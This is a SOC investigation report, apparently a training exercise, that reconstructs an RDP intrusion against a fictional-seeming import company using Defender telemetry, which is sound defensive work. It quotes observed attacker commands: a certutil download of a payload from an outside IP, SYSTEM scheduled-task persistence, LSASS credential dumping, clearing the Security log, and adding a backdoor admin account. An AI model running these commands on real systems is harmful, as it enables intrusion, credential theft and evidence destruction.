# SOC Investigation Report  
## Azuki Import/Export – Full Attack Reconstruction  
Analyst: Brian Hannigan  
Environment: Microsoft Defender for Endpoint (Advanced Hunting) + Microsoft Sentinel  
Year: 2025  

---

# Executive Summary

This investigation reconstructed a full multi-stage intrusion against Azuki Import/Export using Microsoft Defender for Endpoint (MDE) and Microsoft Sentinel (KQL).

The attacker:

- Gained RDP access from external IP 88.97.178.12
- Compromised user account kenji.sato
- Performed internal network reconnaissance (arp -a)
- Created a hidden staging directory
- Modified Windows Defender exclusions
- Downloaded malware using certutil.exe (LOLBIN abuse)
- Established persistence via scheduled task
- Deployed credential dumping tool (mm.exe using sekurlsa::logonpasswords)
- Compressed stolen data into export-data.zip
- Exfiltrated data via Discord over HTTPS (port 443)
- Cleared Windows Security logs (wevtutil.exe)
- Created backdoor admin account (support)
- Executed malicious PowerShell script (wupdate.ps1)
- Attempted lateral movement to 10.1.0.188 via mstsc.exe

This represents a complete intrusion lifecycle aligned to MITRE ATT&CK.

---

# Initial Access

**Source IP:** 88.97.178.12  
**Compromised User:** kenji.sato  
**Logon Type:** RemoteInteractive (RDP)

Detected via DeviceLogonEvents.

The attacker authenticated via RDP and gained full interactive access.

---

# Discovery

**Command Observed:** ARP.EXE -a  

The attacker enumerated local network neighbors using built-in Windows utilities.

Table Used: DeviceProcessEvents

---

# Defense Evasion

## Hidden Staging Directory

Created and hidden:

C:\ProgramData\WindowsCache

Command used:

attrib.exe +h +s C:\ProgramData\WindowsCache

This folder served as the primary attacker workspace.

---

## Windows Defender Tampering

Registry Keys Modified:

HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions  
HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths  

Temp directory excluded:

C:\Users\KENJI~1.SAT\AppData\Local\Temp  

This allowed malware execution without scanning.

---

# Execution

## LOLBin Download

Tool used:

certutil.exe  

Command:

certutil.exe -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe  

The attacker downloaded malware disguised as svchost.exe.

---

# Persistence

Scheduled Task Created:

schtasks.exe /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc onlogon /ru SYSTEM /f  

Persistence Payload:

C:\ProgramData\WindowsCache\svchost.exe  

The malware now runs at logon with SYSTEM privileges.

---

# Command & Control

C2 Server: 78.141.196.6  
Port: 443  

Outbound network session initiated by malicious svchost.exe confirmed via DeviceNetworkEvents.

---

# Credential Access

Credential Theft Tool:

mm.exe  

Memory Extraction Module:

sekurlsa::logonpasswords  

The attacker dumped LSASS memory to extract passwords and authentication material.

---

# Collection

Archive Created:

export-data.zip  

The attacker staged stolen files into a compressed archive for exfiltration.

---

# Exfiltration

Service Used:

Discord  

Data was uploaded over HTTPS (port 443), blending with legitimate encrypted traffic.

---

# Anti-Forensics

Log Tampering Command:

wevtutil.exe cl Security  

The attacker cleared the Windows Security log to remove authentication evidence.

---

# Impact & Persistence Account

Backdoor Account:

support  

Command Used:

net.exe localgroup Administrators support /add  

This ensured continued administrative access.

---

# Malicious Script Execution

Script Name:

wupdate.ps1  

Executed via:

powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File wupdate.ps1  

The attacker automated portions of the intrusion using hidden PowerShell execution.

---

# Lateral Movement

Secondary Target:

10.1.0.188  

Tool Used:

mstsc.exe  

Indicates attempted remote access to additional internal host.

---

# Conclusion

The attacker successfully:

- Established persistence
- Extracted credentials
- Staged and exfiltrated data
- Attempted lateral movement
- Tampered with logs
- Created a persistent backdoor account

Full attack lifecycle confirmed using enterprise telemetry.

This investigation demonstrates structured SOC methodology, log analysis, KQL hunting, and MITRE ATT&CK alignment.